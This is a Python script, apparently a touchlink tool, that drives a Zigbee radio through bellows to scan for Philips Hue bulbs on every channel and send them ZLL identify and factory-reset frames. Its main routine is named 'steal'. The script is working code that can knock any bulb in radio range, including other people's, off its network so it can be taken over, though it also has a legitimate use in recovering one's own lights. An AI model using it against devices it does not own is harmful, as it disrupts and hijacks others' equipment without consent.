import asyncio
import time
import sys
import argparse
from random import randint

import bellows
import bellows.cli.util as util
import interpanZll

class Prompt:
    def __init__(self):
        self.q = asyncio.Queue()
        asyncio.get_event_loop().add_reader(sys.stdin, self.got_input)

    def got_input(self):
        asyncio.ensure_future(self.q.put(sys.stdin.readline()))

    async def __call__(self, msg, end='\n', flush=False):
        print(msg, end=end, flush=flush)
        return (await self.q.get()).rstrip('\n')

async def steal(device_path, baudrate, scan_channel):
    # Initialize the device
    print("Initializing device...")
    s = await util.setup(device_path, baudrate)
    
    # Configure radio parameters for SkyConnect
    print("Configuring radio parameters...")
    await s.setConfigurationValue(0x0A, 7)  # EZSP version
    await s.setConfigurationValue(0x11, 0)  # Disable security
    await s.setConfigurationValue(0x64, 80)  # Set TX power to +20 dBm
    
    # Additional radio configurations
    await s.setConfigurationValue(0x63, 0)  # Set CTUNE to default
    await s.setConfigurationValue(0x02, 0)  # Disable PTA
    
    # Get the EUI64 address
    eui64 = await s.getEui64()
    eui64 = bellows.types.named.EmberEUI64(*eui64)
    print(f"Radio EUI64: {eui64}")

    # Start manufacturing library mode
    res = await s.mfglibStart(True)
    util.check(res[0], "Unable to start mfglib")
    print("Started manufacturing library mode")

    prompt = Prompt()

    def handle_incoming(frame_name, response):
        if frame_name != "mfglibRxHandler":
            return

        data = response[2]
        if len(data) < 10:  # Not a proper response
            return

        try:
            resp = interpanZll.ScanResp.deserialize(data)[0]
        except ValueError:
            return
            
        if resp.transactionId != transaction_id:  # Not for us
            return

        targets.add(resp.extSrc)
        print(f"\nFound device: {resp.extSrc}")
        frame = interpanZll.AckFrame(seq=resp.seq).serialize()
        asyncio.create_task(s.mfglibSendPacket(frame))

    cbid = s.add_callback(handle_incoming)

    try:
        scans_per_channel = 3  # Number of times to scan each channel
        for channel in ([scan_channel] if scan_channel else range(11, 27)):
            for scan_attempt in range(scans_per_channel):
                print(f"\nScanning on channel {channel} (attempt {scan_attempt + 1}/{scans_per_channel})")
                res = await s.mfglibSetChannel(channel)
                util.check(res[0], "Unable to set channel")

                transaction_id = randint(0, 0xFFFFFFFF)
                targets = set()

                # Send scan request
                frame = interpanZll.ScanReq(
                    seq=1,
                    srcPan=0,
                    extSrc=eui64,
                    transactionId=transaction_id,
                ).serialize()
                print("Sending scan request...")
                res = await s.mfglibSendPacket(frame)
                util.check(res[0], "Unable to send packet")

                await asyncio.sleep(2)  # Increased wait time for responses

                while targets:
                    target = targets.pop()
                    print(f"\nAttempting to identify device: {target}")
                    # Send identify request
                    frame = interpanZll.IdentifyReq(
                        seq=2,
                        srcPan=0,
                        extSrc=eui64,
                        transactionId=transaction_id,
                        extDst=target,
                        frameControl=0xCC21,
                    ).serialize()
                    await s.mfglibSendPacket(frame)
                    answer = await prompt("Do you want to factory reset the light that just blinked? [y|n] ")

                    if answer.strip().lower() == "y":
                        print(f"Factory resetting {target}")
                        frame = interpanZll.FactoryResetReq(
                            seq=3,
                            srcPan=0,
                            extSrc=eui64,
                            transactionId=transaction_id,
                            extDst=target,
                            frameControl=0xCC21,
                        ).serialize()
                        await s.mfglibSendPacket(frame)
                        await asyncio.sleep(2)  # Increased wait time after reset

    finally:
        # Cleanup
        s.remove_callback(cbid)
        await s.mfglibEnd()
        await s.disconnect()

def main():
    parser = argparse.ArgumentParser(description='Factory reset a Hue light bulb.')
    parser.add_argument('device', type=str, help='Device path, e.g., /dev/ttyUSB0')
    parser.add_argument('-b', '--baudrate', type=int, default=115200, help='Baud rate (default: 115200)')
    parser.add_argument('-c', '--channel', type=int, help='Zigbee channel (defaults to scanning 11 up to 26)')
    args = parser.parse_args()

    try:
        asyncio.get_event_loop().run_until_complete(steal(args.device, args.baudrate, args.channel))
    except KeyboardInterrupt:
        print("\nExiting due to user interrupt")
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
